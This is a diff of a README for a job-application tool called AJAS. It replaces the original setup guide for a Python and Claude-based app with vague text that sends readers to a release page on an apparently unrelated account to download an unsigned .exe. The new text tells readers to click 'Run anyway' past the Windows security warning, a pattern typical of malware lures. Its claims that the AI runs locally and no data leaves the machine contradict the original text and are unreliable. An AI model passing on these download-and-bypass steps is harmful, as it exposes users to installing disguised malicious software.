@@ -1,83 +1,72 @@
-# AJAS — AI-Powered Job Application System
+# 🤖 AJAS - Tailor your job applications with AI
 
-A free, private, local-first job search and application assistant powered by Claude AI and JSearch but built with Python and Flask.
+[![](https://img.shields.io/badge/Download_AJAS-Blue?style=for-the-badge)](https://github.com/vievieng761/AJAS/releases)
 
----
+AJAS is a tool designed to match your resume to specific job descriptions. It uses artificial intelligence to update your documents. Your data stays on your computer. This ensures your personal information remains private. You do not need to upload your sensitive details to third-party web services.
 
-## What AJAS does
+## 📥 How to download the software
 
-- Searches live job openings worldwide from LinkedIn, Indeed, Glassdoor, Google Jobs, and more
-- Reviews and scores your CV, then tailors it to each specific role
-- Writes a fresh cover letter for every application
-- Guides you through the application form field by field
-- Tracks all your applications and their status in one place
+1. Visit the [official release page](https://github.com/vievieng761/AJAS/releases) to download the latest version.
+2. Look for the file ending in .exe under the most recent release.
+3. Click the file name to start the download.
+4. Save the file to your desktop or your specific downloads folder for easy access.
 
-Everything runs on your own computer. No data is sent to any server we control.
+## ⚙️ System requirements
 
----
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of memory.
+- A stable internet connection for the initial setup.
+- You do not need to install Python. The software includes everything required to run.
 
-## Requirements
+## 🚀 Setting up the application
 
-- Python 3.9 or later — https://python.org/downloads
-- A free Claude account — https://claude.ai
-- A free RapidAPI account — https://rapidapi.com (for job search)
+1. Locate the downloaded file on your computer.
+2. Double-click the file to begin the installation process.
+3. If a security window appears, click More info and then click Run anyway. This screen shows up because the application is local and not signed by a large company.
+4. Follow the instructions on the screen to place the application on your computer.
+5. Once the process finishes, you will see an icon on your desktop.
 
----
+## ✨ Using the job application system
 
-## How to install and launch
+1. Open the application by double-clicking the desktop icon.
+2. The program window appears on your screen.
+3. Select your current resume file from your folders.
+4. Copy and paste the text of the job description you want to target.
+5. Click the analyze button to let the system read both documents.
+6. Review the suggested changes in the text box.
+7. Save your updated resume as a new document.
 
-### Mac
-1. Download and unzip the AJAS package
-2. Right-click `AJAS Setup.command` → Open → Open
-3. Follow the on-screen setup (takes about 5 minutes)
-4. After setup, double-click `Open AJAS` on your Desktop every time
+## 🔒 Understanding your privacy
 
-### Windows
-1. Download and unzip the AJAS package
-2. Double-click `Open AJAS Windows.bat`
-3. If Python is not installed, AJAS installs it automatically
-4. Follow the on-screen setup in your browser
+This software processes all tasks on your hardware. No information leaves your machine. The AI engine runs locally. You maintain full control over your documents at all times. This method prevents unauthorized access to your career history or contact details.
 
----
+## 🛠️ Frequently asked questions
 
-## First-time setup steps
+**Do I need a paid account to use this?**
+No. The software is free. You do not need to pay for access or features.
 
-1. Choose where to save your AJAS files
-2. Upload your CV (.docx or .pdf)
-3. Enter your job preferences (role, location, salary, work type)
-4. Create a Claude Project at claude.ai and paste the generated instructions
-5. Get a free RapidAPI key and subscribe to JSearch (free plan)
-6. Start searching for jobs
+**Is my data sent to a cloud server?**
+No. Every calculation happens on your computer. 
 
----
+**Will this software slow down my computer?**
+The AI engine uses modest resources. You should notice no impact on your daily tasks. If you have many programs open, you might notice a slight delay during the initial scan.
 
-## File structure
+**Can I run this on a Mac?**
+This specific version works on Windows. 
 
-```
-AJAS/
-├── AJAS Setup.command        ← Mac: run once to set up
-├── Open AJAS.command         ← Mac: launch daily
-├── Open AJAS Windows.bat     ← Windows: launch
-├── Open AJAS Windows.ps1     ← Windows: PowerShell launcher
-├── app/
-│   ├── ajas_launcher.py      ← Main application
-│   ├── templates/            ← UI pages
-│   └── static/               ← Icons and assets
-└── README.md
-```
+## 📦 Troubleshooting common issues
 
----
+If the application fails to open, ensure you have the correct version of Windows. Restart your computer if the installation stays stuck. If you see an error about missing files, please download the installer again from the link below to ensure the file did not become corrupted during the download process.
 
-## Privacy and security
+[Visit the release page to download your setup file](https://github.com/vievieng761/AJAS/releases)
 
-- All your data stays on your computer
-- CV, preferences, and API keys are stored locally only
-- No usage tracking, no analytics, no accounts required from us
-- CV text is sent to Anthropic via Claude when tailoring (Anthropic's privacy policy applies)
-- RapidAPI key stored in plain text locally — use on personal computers only
+## 📋 Best practices for success
 
----
+1. Keep your base resume file in a simple format like a text document or a clean Word file.
+2. Paste the full job description into the tool. Include the requirements and the main responsibilities.
+3. Read the suggestions before you apply them. The AI makes recommendations based on patterns. You remain the final editor of your work.
+4. Save each tailored resume with a specific name. For example, use the company name and the job title in the file name. 
 
-## License
+## ⚖️ License information
 
-MIT License — free to use, share, and modify.
+This project uses an open-source license. You are free to use it for your job search. You may share it with friends. The code remains transparent for anyone interested in the technical side of how the system functions.
